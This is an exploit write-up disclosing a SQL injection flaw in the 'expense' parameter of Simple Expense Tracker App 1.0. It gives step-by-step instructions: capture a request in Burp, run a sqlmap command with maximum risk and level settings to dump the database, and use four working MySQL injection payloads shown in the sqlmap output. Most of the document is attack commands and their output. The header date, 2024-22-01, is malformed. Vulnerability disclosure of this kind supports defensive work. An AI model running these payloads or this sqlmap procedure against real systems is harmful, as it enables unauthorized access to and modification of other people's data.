# Simple Expense Tracker - SQL Injection-1
+ **Exploit Title:** Simple Expense Tracker - SQL Injection-1
+ **Date:** 2024-22-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/16794/simple-expense-tracker-app-using-php-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=16794&title=Expense+Tracker+App+Using+PHP+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
 Simple Expense Tracker App 1.0 allows SQL Injection via the 'expense' parameter in "http://localhost/simple-expense-tracker-app/endpoint/delete_expense.php?expense=1". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/simple-expense-tracker-app/"
+ Select any expense and press the delete-expense button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /simple-expense-tracker-app/endpoint/delete_expense.php?expense=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'expense' parameter to dump the database.
```
sqlmap -r r.txt -p expense --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
Parameter: expense (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: expense=1' RLIKE (SELECT (CASE WHEN (8149=8149) THEN 1 ELSE 0x28 END))-- YCuy

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: expense=1' AND EXTRACTVALUE(1814,CONCAT(0x5c,0x71706a6b71,(SELECT (ELT(1814=1814,1))),0x7178766b71))-- OXWI

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: expense=1';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: expense=1' AND (SELECT 4006 FROM (SELECT(SLEEP(5)))hjyB)-- NQYA
---
[18:46:49] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:46:49] [INFO] fetching current database
[18:46:49] [INFO] retrieved: 'expense_tracker_db'
current database: 'expense_tracker_db'
```
+ current database: `expense_tracker_db`

![Ekran görüntüsü 2024-01-30 025239](https://github.com/BurakSevben/CVEs/assets/117217689/c9f6f289-d414-4b75-a4fb-ee4c9176c9e6)



